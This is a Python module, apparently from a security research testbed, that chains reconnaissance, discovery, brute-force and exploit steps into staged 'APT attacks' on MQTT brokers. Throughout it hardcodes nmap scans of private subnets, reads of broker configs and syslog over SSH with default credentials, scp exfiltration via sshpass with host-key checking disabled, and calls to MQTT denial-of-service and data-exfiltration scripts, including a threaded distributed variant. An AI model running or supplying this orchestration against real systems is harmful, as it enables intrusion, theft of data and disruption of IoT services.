"""Module to build and run customized APT attacks"""
import os
import pickle
import random
import threading
import time
import copy
from datetime import datetime
from enum import Enum
from queue import Queue
import pytz
from abc import ABC, abstractmethod
import ssh_auto_access as ssh
from typing import Optional, List, Dict, Tuple, Literal


class APTPhase(Enum):
    """Enum representing APT phases"""
    RECONNAISSANCE = 1,
    BRUTE_FORCE = 2,
    DISCOVERY = 3,
    EXPLOIT = 4,
    PAUSE = -1


class APTStep(ABC):
    """Python abstract class to define a supertype for every attack step"""

    def __init__(self, hostname: Optional[str], pause: float = 1.0) -> None:
        if pause < 0:
            raise ValueError("Pause must be a positive float")
        self.hostname = hostname
        self.pause = pause

    def set_host(self, hostname: str) -> None:
        self.hostname = hostname

    @abstractmethod
    def get_step_name(self) -> str:
        pass

    @abstractmethod
    def run_step(self, step_number: int, attack_name: str, iteration: int) -> List[Dict]:
        pass

    def set_pause(self, pause: float) -> None:
        self.pause = pause

    @abstractmethod
    def get_phase(self) -> APTPhase:
        pass

    def _build_results(self, step_number: int, attack_name: str, start_time: datetime,
                       iteration: int) -> Dict:
        return {
            "phase_number": self.get_phase().value,
            "step_number": step_number,
            "attack_name": attack_name,
            "phase_name": self.get_phase().name,
            "start_time": start_time,
            "end_time": datetime.now(tz=pytz.UTC),
            "command": self.get_step_name(),
            "iteration": iteration,
        }


class PauseStep(APTStep):
    """Python class to add more pauses between attack steps"""

    def __init__(self, pause: float = 60):
        super().__init__(None)
        if pause < 0:
            raise ValueError("Pause must be a positive float")
        self.long_pause = pause

    def get_step_name(self) -> str:
        return "pause"

    def get_phase(self) -> APTPhase:
        return APTPhase.PAUSE

    def run_step(self, step_number: int, attack_name: str, iteration: int) -> List[Dict]:
        print("Pausing execution...")
        time.sleep(random.random() * self.long_pause)
        return [{}]


class DiscStep(APTStep):
    """Python class for Discovery steps, it allows to build custom discovery steps by providing corresponding commands"""

    def __init__(self, hostname: str, commands: str, ssh_username: str = "ope", ssh_password: str = "maint",
                 pause: float = 1) -> None:
        super().__init__(hostname, pause)
        self.ssh_username = ssh_username
        self.ssh_password = ssh_password
        self.commands = commands.split(';')

    def get_step_name(self) -> str:
        return self.commands[0].split()[0]

    def run_step(self, step_number: int, attack_name: str, iteration: int) -> List[Dict]:
        start_time = datetime.now(tz=pytz.UTC)
        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password, self.commands, 0, self.pause, "./out.log")
        return [super()._build_results(step_number, attack_name, start_time, iteration)]

    def get_phase(self) -> APTPhase:
        return APTPhase.DISCOVERY


class RecStep(APTStep):
    """Python class for Reconnaissance steps, it allows to build custom reconnaissance steps by providing corresponding """

    def __init__(self, hostname: Optional[str], commands: str, pause: float = 1) -> None:
        super().__init__(hostname, pause)
        self.commands = commands.split(';')

    def get_step_name(self) -> str:
        return self.commands[0].split()[0]

    def run_step(self, step_number: int, attack_name: str, iteration: int) -> List[Dict]:
        start_time = datetime.now(tz=pytz.UTC)
        for command in self.commands:
            print(f"Executing command - {command}...")
            os.system(command + " | tee -a ./out.log")
        return [super()._build_results(step_number, attack_name, start_time, iteration)]

    def get_phase(self) -> APTPhase:
        return APTPhase.RECONNAISSANCE


class NetstatStep(RecStep):
    """Python class implementing reconnaissance with netstat"""

    def __init__(self, pause: float = 1):
        super().__init__(None, "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr",
                         pause)

    def get_step_name(self) -> str:
        return "netstat"


class Nmap10T4Step(RecStep):
    """Python class implementing reconnaissance with nmap assuming a network topology of type A with speed T4"""

    def __init__(self, pause: float = 1):
        super().__init__(None, "sudo nmap -sS -T4 -Pn 10.0.0.0/24",
                         pause)

    def get_step_name(self) -> str:
        return "nmap_10_T4"


class Nmap192T4Step(RecStep):
    """Python class implementing reconnaissance with nmap assuming a network topology of type C with speed T4"""

    def __init__(self, pause: float = 1):
        super().__init__(None, "sudo nmap -sS -T4 -Pn 192.168.1.0/24",
                         pause)

    def get_step_name(self) -> str:
        return "nmap_192_T4"


class Nmap10T5Step(RecStep):
    """Python class implementing reconnaissance with nmap assuming a network topology of type A with speed T5"""

    def __init__(self, pause: float = 1):
        super().__init__(None, "sudo nmap -sS -T5 -Pn 10.0.0.0/24",
                         pause)

    def get_step_name(self) -> str:
        return "nmap_10_T5"


class Nmap192T5Step(RecStep):
    """Python class implementing reconnaissance with nmap assuming a network topology of type C with speed T5"""

    def __init__(self, pause: float = 1):
        super().__init__(None, "sudo nmap -sS -T5 -Pn 192.168.1.0/24",
                         pause)

    def get_step_name(self) -> str:
        return "nmap_192_T5"


class NmapSubDiscStep(DiscStep):
    """Python class implementing discovery by subscribing with nmap to publishers in the mqtt network"""

    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint", pause: float = 1):
        super().__init__(hostname, "sudo nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24", ssh_username,
                         ssh_password, pause)

    def get_step_name(self) -> str:
        return "nmap_sub"


class NmapMQTTDiscStep(DiscStep):
    """Python class implementing discovery by scanning the network from the inside with nmap"""

    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint", pause: float = 1):
        super().__init__(hostname, "sudo /usr/bin/nmap -sS -T2 -Pn -p 1883,8883 10.0.0.0/24", ssh_username,
                         ssh_password, pause)

    def get_step_name(self) -> str:
        return "nmap_mqtt"


class NmapBannerDiscStep(DiscStep):
    """Python class implementing discovery by running the banner script"""

    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint", pause: float = 1):
        super().__init__(hostname, "sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24", ssh_username,
                         ssh_password, pause)

    def get_step_name(self) -> str:
        return "nmap_banner"


class MqttCatDiscStep(DiscStep):
    """Python class implementing discovery by exploring MQTT configuration files"""

    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint", pause: float = 1):
        super().__init__(hostname, "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;\
                         cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log;\
                          cat /var/log/syslog;cat /var/log/syslog", ssh_username, ssh_password, pause)

    def get_step_name(self) -> str:
        return "mqtt_cat"


class BruteForceStep(APTStep):
    """Python class implementing the brute forcing of an ssh login.
     This step already implements a nmap ping scanning to discover active hosts to brute force"""

    def __init__(self, pause: float = 1, is_distributed: bool = False, action: Literal["m", "t"] = "m",
                 host: Optional[str] = None):
        super().__init__(None, pause)
        self.is_distributed = is_distributed
        self.action = action
        self.host = host

    def get_phase(self) -> APTPhase:
        return APTPhase.BRUTE_FORCE

    def run_step(self, step_number: int, attack_name: str, iteration: int) -> List[Dict]:
        start_time = datetime.now(tz=pytz.UTC)
        if self.is_distributed:
            cmd_flag = "-d"
        else:
            cmd_flag = "-nd"
        if self.host:
            os.system(f"python3 ssh_brute_force.py {cmd_flag} -a {self.action} --host {self.host}")
        else:
            os.system(f"python3 ssh_brute_force.py {cmd_flag} -a {self.action}")
        return [super()._build_results(step_number, attack_name, start_time, iteration)]

    def get_step_name(self) -> str:
        return "brute_force"


class ExploitStep(APTStep, ABC):
    """Abstract Python class implementing the exploits"""

    def __init__(self, hostname: str, mqtt_username: Optional[str], mqtt_password: Optional[str],
                 ssh_username: str = "ope",
                 ssh_password: str = "maint", duration: float = 10, pause: float = 1):
        if duration < 0:
            raise ValueError("duration must be positive")
        super().__init__(hostname, pause)
        self.ssh_username = ssh_username
        self.ssh_password = ssh_password
        self.mqtt_username = mqtt_username
        self.mqtt_password = mqtt_password
        self.duration = duration

    def get_phase(self) -> APTPhase:
        return APTPhase.EXPLOIT

    @abstractmethod
    def run_exploit(self) -> None:
        pass

    def run_step(self, step_number: int, attack_name: str, iteration: int) -> List[Dict]:
        start_time = datetime.now(tz=pytz.UTC)
        print(f"Running exploit {self.get_step_name()}...")
        self.run_exploit()
        print(f"Completed running exploit {self.get_step_name()}")
        result = self._build_results(step_number, attack_name, start_time, iteration)
        time.sleep(random.random() * self.pause)
        return [result]


class ScpExfiltrateStep(ExploitStep):
    """Exfiltrate data from a specified host to the local filesystem"""

    def __init__(self, hostname: str, ssh_username: str = "ope",
                 ssh_password: str = "maint", src_file: str = "/to_be_exfiltrated_sub", dest_file="./exfiltrated_data",
                 timeout: float = 60, pause: float = 1):
        super().__init__(hostname, None, None, ssh_username, ssh_password, timeout, pause)
        self.src_file = src_file
        self.dest_file = dest_file

    def get_step_name(self) -> str:
        return "scp_exfiltrate"

    def run_exploit(self) -> None:
        os.system(
            f'sshpass -p "{self.ssh_password}" scp -o StrictHostKeyChecking=no -r {self.ssh_username}@{self.hostname}:/{self.src_file} {self.dest_file} | tee -a ./out.log')


class DollarCharExploit(ExploitStep):
    """Python class implementing dollar_char_attack exploit"""

    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
                 ssh_password: str = "maint", duration: float = 10, pause: float = 1):
        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)

    def get_step_name(self) -> str:
        return "dollar_char"

    def run_exploit(self) -> None:
        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
                         [
                             f"python3 dollar_char_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
                         0, 0, "./out.log")


class EmptyConnExploit(ExploitStep):
    """Python class implementing empty_connection_dos exploit"""

    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
                 ssh_password: str = "maint", duration: float = 10, pause: float = 1):
        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)

    def get_step_name(self) -> str:
        return "empty_conn"

    def run_exploit(self) -> None:
        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
                         [
                             f"python3 empty_connection_dos.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
                         0, 0, "./out.log")


class PubExfExploit(ExploitStep):
    """Python class which implements the pub_exfiltration exploit"""

    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, topics: List[str],
                 ssh_username: str = "ope", ssh_password: str = "maint", duration: float = 10, pause: float = 1):
        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
        self.topics = topics

    def get_step_name(self) -> str:
        return "pub_exf"

    def run_exploit(self) -> None:
        cmd_topics = ""
        for topic in self.topics:
            cmd_topics += f" {topic}"
        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
                         [
                             f"python3 pub_exfiltration.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration} -t {cmd_topics}"],
                         0, 0, "./out.log")


class QOSMIDExploit(ExploitStep):
    """Python class implementing the qos_mid_dos exploit"""

    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
                 ssh_password: str = "maint", duration: float = 10, number: int = 20, pause: float = 1):
        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
        self.number = number

    def get_step_name(self) -> str:
        return "qos_mid"

    def run_exploit(self) -> None:
        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
                         [
                             f"python3 qos_mid_dos.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration} -n {self.number}"],
                         0, 0, "./out.log")


class SlashCharExploit(ExploitStep):
    """Python class implementing the slash_char_dos exploit"""

    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
                 ssh_password: str = "maint", duration: float = 10, pause: float = 1):
        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)

    def get_step_name(self) -> str:
        return "slash_char"

    def run_exploit(self) -> None:
        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
                         [
                             f"python3 slash_char_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
                         0, 0, "./out.log")


class UserPropExploit(ExploitStep):
    """Python class implementing the user_property_attack exploit"""

    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
                 ssh_password: str = "maint", duration: float = 10, pause: float = 1):
        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)

    def get_step_name(self) -> str:
        return "user_prop"

    def run_exploit(self) -> None:
        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
                         [
                             f"python3 user_property_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
                         0, 0, "./out.log")


class ZeroLenExploit(ExploitStep):
    """Python class implementing the zero_len_attack exploit"""

    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
                 ssh_password: str = "maint", duration: float = 10, pause: float = 1):
        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)

    def get_step_name(self) -> str:
        return "zero_len"

    def run_exploit(self) -> None:
        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
                         [
                             f"python3 zero_len_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
                         0, 0, "./out.log")


class DistributedExploit(APTStep):
    """Python class which builds a distributed attack from an instance of type ExploitStep"""

    def __init__(self, host_list: List[str], number_of_instances: int, exploit: ExploitStep):
        if isinstance(exploit, DistributedExploit):
            raise ValueError("Cannot create a DistributedExploit from an instance of type DistributedExploit")
        super().__init__(None, exploit.pause)
        self.original_exploit = exploit
        self.distributed_exploits = []
        self.results_queue = (Queue(), threading.Lock())
        for i in range(number_of_instances):
            copy_exploit = copy.copy(exploit)
            copy_exploit.set_host(random.choice(host_list))
            self.distributed_exploits.append(copy_exploit)

    def get_step_name(self) -> str:
        return f"{self.original_exploit.get_step_name()}_ddos"

    def run_step(self, step_number: int, attack_name: str, iteration: int) -> List[Dict]:
        threads = []
        results = []
        for exploit in self.distributed_exploits:
            def parallel_exploit(p_exploit: ExploitStep, p_step_number: int, p_attack_name: str, p_iteration: int):
                result = p_exploit.run_step(p_step_number, p_attack_name, p_iteration)
                if result is not None:
                    with self.results_queue[1]:
                        self.results_queue[0].put(result)

            threads.append(threading.Thread(parallel_exploit(exploit, step_number, attack_name, iteration)))
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        with self.results_queue[1]:
            while not self.results_queue[0].empty():
                results += self.results_queue[0].get()
        return results

    def get_phase(self) -> APTPhase:
        return APTPhase.EXPLOIT


class APTAttack:
    """
    Python class used to build and run customized APT attacks.

    Parameters
    ----------
    attack_steps: List[Tuple[APTStep, int]]
        specifies each attack step and the number of times it will be repeated during execution.
    attack_name: str
        name to be used for the attack when registering the results
    exp_details: List[Dict]
        a List to append the results of the attack.
    file_path_i: str
        file which is used to save the experiment results up to the point of an interruption by KeyboardInterrupt.
    """

    def __init__(self, attack_steps: List[Tuple[APTStep, int]], attack_name: str, exp_details: List[Dict],
                 file_path_i: str):
        self.steps = attack_steps
        self.attack_name = attack_name
        self.exp_details = exp_details
        self.file_path_i = file_path_i

    def run(self, n_iterations: int = 1) -> List[Dict]:
        """
        Runs all steps of the APT attack and return the updated experiment details List.

        Parameters
        ----------
        n_iterations: int
            how many times the entire sequence of steps will be repeated

        Returns
        -------
        List[Dict]
            the updated experiment details List
        """
        try:
            for i in range(n_iterations):
                step_number = 0
                for step in self.steps:
                    if len(step) < 2:
                        repetitions = 1
                    else:
                        repetitions = step[1]
                    for j in range(repetitions):
                        list_exp_Dict = step[0].run_step(step_number, self.attack_name, i)
                        for exp in list_exp_Dict:
                            if exp:
                                self.exp_details.append(exp)
                        step_number += 1
            return self.exp_details
        except KeyboardInterrupt:
            with open(self.file_path_i, "wb") as file:
                pickle.dump(self.exp_details, file)

    def save_in(self, file_path: str = None):
        """
        Dumps the results of the attack to the specified file_path

        Parameters
        ----------
        file_path: str
            the path of the file where results are saved
        """
        if file_path is None:
            file_path = self.file_path_i
        with open(file_path, "wb") as file:
            pickle.dump(self.exp_details, file)
